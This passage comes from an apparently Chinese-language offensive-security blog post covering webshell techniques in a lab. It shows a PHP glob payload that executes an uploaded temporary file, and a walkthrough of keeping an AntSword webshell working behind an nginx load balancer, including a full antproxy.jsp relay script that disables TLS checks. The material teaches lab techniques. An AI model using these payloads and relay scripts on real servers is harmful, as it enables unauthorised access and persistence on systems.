data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png\" alt=\"image.png\"></p>\n<p>所有文件名都是小写，只有 PHP 生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示 “大写字母” 的 glob 通配符，就能精准找到我们要执行的文件。</p>\n<p>翻开 ascii 码表，可见大写字母位于 <code>@</code> 与 <code>[</code> 之间：</p>\n<p>那么，我们可以利用 <code>[@-[]</code>  来表示大写字母：</p>\n<p><img data-src=\"https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png\" alt=\"image.png\"></p>\n<p>当然，php 生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>\n<p>最后，我传入的 code 为 <code>?&gt;&lt;?=</code> . /???/???[@-[] <code>;?&gt;</code> ，发送数据包如下：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222160238734.png\" alt=\"image-20221222160238734\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s\">无字母数字 webshell 之提高篇 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS5odG1s\">一些不包含数字和字母的 webshell | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcGhwLWNhbGxiYWNrLWJhY2tkb29yLmh0bWw=\">创造 tips 的秘籍 ——PHP 回调后门 | 离别歌 (leavesongs.com)</span></p>\n<h2 id=\"niginx负载均衡下的webshell\"><a class=\"markdownIt-Anchor\" href=\"#niginx负载均衡下的webshell\">#</a> niginx 负载均衡下的 webshell</h2>\n<p>根据我的老师说，这是一道奇安信四面的原题，确实很有意思，思路很棒</p>\n<p>反向代理方式其中比较流行的方式是用 nginx 来做负载均衡。我们先简单的介绍一下 nginx 支持的几种策略：</p>\n<table>\n<thead>\n<tr>\n<th><strong>名称</strong></th>\n<th><strong>策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>轮询（默认）</strong></td>\n<td>按请求顺序逐一分配</td>\n</tr>\n<tr>\n<td>weight</td>\n<td>根据权重分配</td>\n</tr>\n<tr>\n<td>ip_hash</td>\n<td>根据客户端 IP 分配</td>\n</tr>\n<tr>\n<td>least_conn</td>\n<td>根据连接数分配</td>\n</tr>\n<tr>\n<td>fair (第三方)</td>\n<td>根据响应时间分配</td>\n</tr>\n<tr>\n<td>url_hash (第三方)</td>\n<td>根据 URL 分配</td>\n</tr>\n</tbody>\n</table>\n<p>其中 ip_hash、url_hash 这种能固定访问到某个节点的情况，我们也不讨论，跟单机没啥区别么不是。</p>\n<p>实验环境:</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC1MYWJz\">AntSwordProject/AntSword-Labs: Awesome environment for antsword tests (github.com)</span></p>\n<p>LBSNode1 和 LBSNode2 均存在位置相同的 Shell: ant.jspNode1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。 我们只能通过 nginx 这台机器访问。nginx 的配置如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                          ┌─────────────┐</span><br><span class=\"line\">                          │             │</span><br><span class=\"line\">                   ┌──────►  LBSNode 1  │</span><br><span class=\"line\">┌─────────┐        │      │             │</span><br><span class=\"line\">│         │        │      └─────────────┘</span><br><span class=\"line\">│  Nginx  ├────────┤</span><br><span class=\"line\">│         │        │      ┌─────────────┐</span><br><span class=\"line\">└─────────┘        │      │             │</span><br><span class=\"line\">                   └──────►  LBSNode 2  │</span><br><span class=\"line\">                          │             │</span><br><span class=\"line\">                          └─────────────┘</span><br></pre></td></tr></table></figure>\n<p>Node1 和 Node2 均是 tomcat 8 ，在内网中开放了 8080 端口，我们在外部是没法直接访问到的。</p>\n<p>我们只能通过 nginx 这台机器访问。nginx 的配置如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@68569d913743:/etc/nginx/conf.d# cat default.conf </span><br><span class=\"line\">upstream lbspool &#123;</span><br><span class=\"line\">  server lbsnode1:8080;</span><br><span class=\"line\">  server lbsnode2:8080;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       80 default_server;</span><br><span class=\"line\">    server_name  _;</span><br><span class=\"line\">    charset utf-8;</span><br><span class=\"line\">    root   /usr/share/nginx/html;</span><br><span class=\"line\">    index index.jsp index.html index.htm;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://lbspool;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>安装后运行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos loadbalance-jsp]# docker-compose  up -d </span><br><span class=\"line\">Building lbsnode1</span><br><span class=\"line\">Sending build context to Docker daemon  3.584kB</span><br><span class=\"line\">Step 1/3 : FROM tomcat:8-jre8</span><br><span class=\"line\">8-jre8: Pulling from library/tomcat</span><br><span class=\"line\">0e29546d541c: Pull complete </span><br><span class=\"line\">9b829c73b52b: Pull complete </span><br><span class=\"line\">cb5b7ae36172: Pull complete </span><br><span class=\"line\">99ce012bef04: Pull complete </span><br><span class=\"line\">22dc2a72d098: Pull complete </span><br><span class=\"line\">9c69a57e10d9: Pull complete </span><br><span class=\"line\">0c402b19a0b5: Pull complete </span><br><span class=\"line\">8763e342e4d6: Pull complete </span><br><span class=\"line\">b0c861fdc153: Pull complete </span><br><span class=\"line\">ed0917d955ad: Pull complete </span><br><span class=\"line\">Digest: sha256:5acd69685158898fda4eb4b854e2170068ced2c925ce9a364d214893e966fad6</span><br><span class=\"line\">Status: Downloaded newer image for tomcat:8-jre8</span><br><span class=\"line\"> ---&gt; cc1cf9719b23</span><br><span class=\"line\">Step 2/3 : COPY src/ant.jsp /usr/local/tomcat/webapps/ROOT/ant.jsp</span><br><span class=\"line\"> ---&gt; 47aa660fe449</span><br><span class=\"line\">Step 3/3 : EXPOSE 8080</span><br><span class=\"line\"> ---&gt; Running in 6c4c3ca597ba</span><br><span class=\"line\">Removing intermediate container 6c4c3ca597ba</span><br><span class=\"line\"> ---&gt; 5024db4a4111</span><br><span class=\"line\">Successfully built 5024db4a4111</span><br><span class=\"line\">Successfully tagged loadbalance-jsp_lbsnode1:latest</span><br><span class=\"line\">WARNING: Image for service lbsnode1 was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.</span><br><span class=\"line\">Building lbsnode2</span><br><span class=\"line\">Sending build context to Docker daemon  3.584kB</span><br><span class=\"line\">Step 1/3 : FROM tomcat:8-jre8</span><br><span class=\"line\"> ---&gt; cc1cf9719b23</span><br><span class=\"line\">Step 2/3 : COPY src/ant.jsp /usr/local/tomcat/webapps/ROOT/ant.jsp</span><br><span class=\"line\"> ---&gt; Using cache</span><br><span class=\"line\"> ---&gt; 47aa660fe449</span><br><span class=\"line\">Step 3/3 : EXPOSE 8080</span><br><span class=\"line\"> ---&gt; Using cache</span><br><span class=\"line\"> ---&gt; 5024db4a4111</span><br><span class=\"line\">Successfully built 5024db4a4111</span><br><span class=\"line\">Successfully tagged loadbalance-jsp_lbsnode2:latest</span><br><span class=\"line\">WARNING: Image for service lbsnode2 was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.</span><br><span class=\"line\">Pulling nginx (nginx:1.17)...</span><br><span class=\"line\">1.17: Pulling from library/nginx</span><br><span class=\"line\">afb6ec6fdc1c: Pull complete</span><br><span class=\"line\">b90c53a0b692: Pull complete</span><br><span class=\"line\">11fa52a0fdc0: Pull complete</span><br><span class=\"line\">Digest: sha256:6fff55753e3b34e36e24e37039ee9eae1fe38a6420d8ae16ef37c92d1eb26699</span><br><span class=\"line\">Status: Downloaded newer image for nginx:1.17</span><br><span class=\"line\">Creating loadbalance-jsp_lbsnode1_1 ... done</span><br><span class=\"line\">Creating loadbalance-jsp_lbsnode2_1 ... done</span><br><span class=\"line\">Creating loadbalance-jsp_nginx_1    ... done</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos loadbalance-jsp]# docker ps -a </span><br><span class=\"line\">CONTAINER ID   IMAGE                      COMMAND                  CREATED         STATUS                            PORTS                                     NAMES</span><br><span class=\"line\">68569d913743   nginx:1.17                 &quot;nginx -g &#x27;daemon of…&quot;   7 seconds ago   Up 6 seconds                      0.0.0.0:18080-&gt;80/tcp, :::18080-&gt;80/tcp   loadbalance-jsp_nginx_1</span><br><span class=\"line\">f3175d7fbc4d   loadbalance-jsp_lbsnode2   &quot;catalina.sh run&quot;        9 seconds ago   Up 7 seconds                      8080/tcp                                  loadbalance-jsp_lbsnode2_1</span><br><span class=\"line\">36b280c80c6c   loadbalance-jsp_lbsnode1   &quot;catalina.sh run&quot;        9 seconds ago   Up 7 seconds                      8080/tcp                                  loadbalance-jsp_lbsnode1_1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225150810566.png\" alt=\"image-20221225150810566\"></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">Shell</th>\n<th style=\"text-align:center\">密码</th>\n<th style=\"text-align:center\">编码器</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><code>http://127.0.0.1:18080/ant.jsp</code></td>\n<td style=\"text-align:center\"><code>ant</code>  ｜  <code>default</code></td>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n<p>使用蚁剑连接</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225151010579.png\" alt=\"image-20221225151010579\"></p>\n<p>打开虚拟终端</p>\n<p>然后连接目标，因为两台节点都在相同的位置存在 ant.jsp，所以连接的时候也没出现什么异常</p>\n<p>但是我们会一直在两个节点上轮询</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225151054131.png\" alt=\"image-20221225151054131\"></p>\n<p>因为没有 ifconfig 和 ip a 命令，使用时需要安装 <code>apt install net-tools</code> ，但是由于负载分担导致需要安装两次</p>\n<p><strong>难点一</strong>：我们需要在<strong>每一台节点</strong>的<strong>相同位置</strong>都上传<strong>相同内容的 WebShell</strong></p>\n<p>一旦有一台机器上没有，那么在请求轮到这台机器上的时候，就会出现 404 错误，影响使用。<strong>是的，这就是你出现一会儿正常，一会儿错误的原因。</strong></p>\n<p><strong>难点二</strong>：我们在执行命令时，<strong>无法知道下次的请求交给哪台机器去执行</strong>。</p>\n<p>我们执行 ip addr 查看当前执行机器的 ip 时，可以看到一直在飘，因为我们用的是轮询的方式，还算能确定，一旦涉及了权重等其它指标，就让你好好体验一波什么叫飘乎不定。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183659128.png\" alt=\"image-20221225183659128\"></p>\n<p><strong>难点三：<strong>当我们需要</strong>上传一些工具</strong>时，麻烦来了 **：**</p>\n<p>由于 antSword 上传文件时，采用的分片上传方式，把一个文件分成了多次 HTTP 请求发送给了目标，所以尴尬的事情来了，两台节点上，各一半，而且这一半到底是怎么组合的，取决于 LBS 算法</p>\n<p><strong>难点四：由于目标机器不能出外网，想进一步深入，只能使用 reGeorg/HTTPAbs 等 HTTP Tunnel，可在这个场景下，这些 tunnel 脚本全部都失灵了。</strong></p>\n<p><strong>Plan A</strong>  <strong>关掉其中一台机器</strong> <strong>（作死）</strong></p>\n<p>是的，首先想到的第一个方案是关机 / 停服，只保留一台机器，因为健康检查机制的存在，很快其它的节点就会被 nginx 从池子里踢出去，那么妥妥的就能继续了。</p>\n<p>影响业务，还会造成灾难，直接 Pass 不考虑。（实验环境下，权限够的时候是可以测试可行性的）。</p>\n<p><strong>Plan B</strong>   <strong>执行前先判断要不要执行</strong></p>\n<p>我们既然无法预测下一次是哪台机器去执行，那我们的 Shell 在执行 Payload 之前，先判断一下要不要执行不就行了？</p>\n<p>以执行命令时 Bash 为例，在执行前判断一下 IP：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183448234.png\" alt=\"image-20221225183448234\"></p>\n<p><strong>Plan C</strong>   <strong>在 Web 层做一次 HTTP 流量转发</strong> <strong>（重点）</strong></p>\n<p>没错，我们用 AntSword 没法直接访问 LBSNode1 内网 IP (172.23.0.2) 的 8080 端口，但是有人能访问呀，除了 nginx 能访问之外，<strong>LBSNode2 这台机器也是可以访问 Node1 这台机器的 8080 端口</strong>的。</p>\n<p>还记不记得 「PHP Bypass Disable Function」 这个插件，我们在这个插件加载 so 之后，本地启动了一个 httpserver，然后我们用到了 HTTP 层面的流量转发脚本 「<strong>antproxy.php</strong>」, 我们放在这个场景下看：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225152044677.png\" alt=\"image-20221225152044677\"></p>\n<p>我们一步一步来看这个图，我们的目的是：<strong>所有的数据包都能发给「LBSNode 1」这台机器。</strong></p>\n<p>首先是 第 1 步，我们请求 /antproxy.jsp，这个请求发给 nginx</p>\n<p>nginx 接到数据包之后，会有两种情况：</p>\n<p>我们先看黑色线，第 2 步把请求传递给了目标机器，请求了 Node1 机器上的 /antproxy.jsp，接着 第 3 步，/antproxy.jsp 把请求重组之后，传给了 Node1 机器上的 /ant.jsp，成功执行。</p>\n<p>再来看红色线，第 2 步把请求传给了 Node2 机器，接着第 3 步，Node2 机器上面的 /antproxy.jsp 把请求重组之后，传给了 Node1 的 /ant.jsp，成功执行。</p>\n<p><strong>1.</strong> <strong>创建 antproxy.jsp 脚本</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183524538.png\" alt=\"image-20221225183524538\"></p>\n<p><strong>修改转发地址</strong>，转向<strong>目标 Node</strong> 的 内网 IP 的 <strong>目标脚本</strong> 访问地址。</p>\n<p><strong>注意：不仅仅是 WebShell 哟，还可以改成 reGeorg 等脚本的访问地址。</strong></p>\n<p>我们将 target 指向了 LBSNode1 的 ant.jsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;javax.net.ssl.*&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.DataInputStream&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.OutputStream&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.net.HttpURLConnection&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.net.URL&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.security.KeyManagementException&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.security.NoSuchAlgorithmException&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.security.cert.CertificateException&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ page import=&quot;java.security.cert.X509Certificate&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\"></span><br><span class=\"line\">  public static void ignoreSsl() throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        HostnameVerifier hv = new HostnameVerifier() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            public boolean verify(String urlHostName, SSLSession session) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                return true;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        trustAllHttpsCertificates();</span><br><span class=\"line\"></span><br><span class=\"line\">        HttpsURLConnection.setDefaultHostnameVerifier(hv);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static void trustAllHttpsCertificates() throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        TrustManager[] trustAllCerts = new TrustManager[] &#123; new X509TrustManager() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            public X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                return null;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\"></span><br><span class=\"line\">            public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                // Not implemented</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\"></span><br><span class=\"line\">            public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                // Not implemented</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">            sc.init(null, trustAllCerts, new java.security.SecureRandom());</span><br><span class=\"line\"></span><br><span class=\"line\">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (KeyManagementException e) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (NoSuchAlgorithmException e) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"></span><br><span class=\"line\">        String target = &quot;http://172.21.0.2:8080/ant.jsp&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">        URL url = new URL(target);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (&quot;https&quot;.equalsIgnoreCase(url.getProtocol())) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            ignoreSsl();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        HttpURLConnection conn = (HttpURLConnection)url.openConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">        StringBuilder sb = new StringBuilder();</span><br><span class=\"line\"></span><br><span class=\"line\">        conn.setRequestMethod(request.getMethod());</span><br><span class=\"line\"></span><br><span class=\"line\">        conn.setConnectTimeout(30000);</span><br><span class=\"line\"></span><br><span class=\"line\">        conn.setDoOutput(true);</span><br><span class=\"line\"></span><br><span class=\"line\">        conn.setDoInput(true);</span><br><span class=\"line\"></span><br><span class=\"line\">        conn.setInstanceFollowRedirects(false);</span><br><span class=\"line\"></span><br><span class=\"line\">        conn.connect();</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream baos=new ByteArrayOutputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        OutputStream out2 = conn.getOutputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        DataInputStream in=new DataInputStream(request.getInputStream());</span><br><span class=\"line\"></span><br><span class=\"line\">        byte[] buf = new byte[1024];</span><br><span class=\"line\"></span><br><span class=\"line\">        int len = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">        while ((len = in.read(buf)) != -1) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            baos.write(buf, 0, len);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        baos.flush();</span><br><span class=\"line\"></span><br><span class=\"line\">        baos.writeTo(out2);</span><br><span class=\"line\"></span><br><span class=\"line\">        baos.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        InputStream inputStream = conn.getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        OutputStream out3=response.getOutputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        int len2 = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">        while ((len2 = inputStream.read(buf)) != -1) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            out3.write(buf, 0, len2);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        out3.flush();</span><br><span class=\"line\"></span><br><span class=\"line\">        out3.close();</span><br><span class=\"line\"></span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>a) 不要使用上传功能</strong>，上传功能会分片上传，导致分散在不同 Node 